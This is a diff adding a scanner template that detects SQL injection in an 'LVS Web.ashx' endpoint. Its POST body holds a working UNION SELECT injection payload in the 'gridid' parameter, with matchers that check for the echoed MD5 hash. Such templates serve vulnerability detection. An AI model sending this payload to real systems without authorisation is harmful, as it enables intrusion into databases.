@@ -1,0 +1,37 @@
+id: poc-yaml-ji-la-ke-ji-lvs-web-ashx-sqli
+info:
+  name: LVS Web.ashx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL injection vulnerability in LVS Web.ashx. The issue occurs in the '_method=GetColumnIndex' parameter where user input is improperly sanitized, allowing SQL injection.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "/ajax/LVS.Web.AgencytaskList,LVS.Web.ashx?_method=GetColumnIndex&_session=r"
+    headers:
+      Content-Type: text/plain; charset=UTF-8
+    body: |
+      src=AgencytaskList
+      gridid=1' UNION ALL SELECT sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+          - "0x"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
